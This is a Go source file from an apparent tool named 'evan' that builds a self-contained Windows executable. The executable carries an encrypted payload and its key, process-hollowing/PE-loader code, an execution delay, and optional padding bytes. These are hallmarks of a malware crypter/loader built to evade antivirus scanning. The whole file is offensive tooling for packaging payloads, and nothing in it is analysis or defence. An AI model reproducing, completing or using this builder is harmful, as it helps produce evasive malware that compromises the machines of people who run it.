package builder

import (
	_ "embed"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"evan/internal/runner"
)

//go:embed runner.go.tmpl
var runnerTemplate string

// CompileSelfContained embeds the encrypted blob and key into a standalone
// Windows Go binary.
func CompileSelfContained(blob, key []byte, outputName, outputDir string, addSizeMB, delaySec float64) error {
	if _, err := exec.LookPath("go"); err != nil {
		return fmt.Errorf("go toolchain not found in PATH: %w", err)
	}

	buildDir, err := os.MkdirTemp("", "evan-build-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(buildDir)

	// 1. The encrypted payload
	if err := os.WriteFile(filepath.Join(buildDir, "payload.enc"), blob, 0o644); err != nil {
		return err
	}

	// 2. Optional padding file
	padBytes := int(addSizeMB * 1024 * 1024)
	if padBytes < 0 {
		padBytes = 0
	}
	if err := os.WriteFile(filepath.Join(buildDir, "padding.bin"), make([]byte, padBytes), 0o644); err != nil {
		return err
	}

	// 3. Write the process hollowing / PE loader logic for Windows
	err = fs.WalkDir(runner.WindowsSources, ".", func(path string, d fs.DirEntry, walkErr error) error {
		if walkErr != nil || d.IsDir() {
			return walkErr
		}
		data, err := runner.WindowsSources.ReadFile(path)
		if err != nil {
			return err
		}
		rewritten := strings.Replace(string(data), "package runner", "package main", 1)
		return os.WriteFile(filepath.Join(buildDir, filepath.Base(path)), []byte(rewritten), 0o644)
	})
	if err != nil {
		return err
	}

	// 4. Write the main wrapper template
	src := strings.Replace(runnerTemplate, "{{KEY}}", hex.EncodeToString(key), 1)
	src = strings.Replace(src, "{{DELAY_MS}}", strconv.FormatInt(int64(delaySec*1000), 10), 1)
	if err := os.WriteFile(filepath.Join(buildDir, "main.go"), []byte(src), 0o644); err != nil {
		return err
	}

	// 5. Write go.mod
	if err := os.WriteFile(filepath.Join(buildDir, "go.mod"),
		[]byte("module evanpayload\n\ngo 1.21\n"), 0o644); err != nil {
		return err
	}

	if err := os.MkdirAll(outputDir, 0o755); err != nil {
		return err
	}
	outPath, err := filepath.Abs(filepath.Join(outputDir, outputName))
	if err != nil {
		return err
	}

	// 6. Build for Windows
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", "-s -w", "-o", outPath, ".")
	cmd.Dir = buildDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	var env []string
	for _, e := range os.Environ() {
		if !strings.HasPrefix(e, "GOOS=") && !strings.HasPrefix(e, "GOARCH=") {
			env = append(env, e)
		}
	}
	cmd.Env = append(env, "GOOS=windows", "GOARCH=arm64")
	return cmd.Run()
}
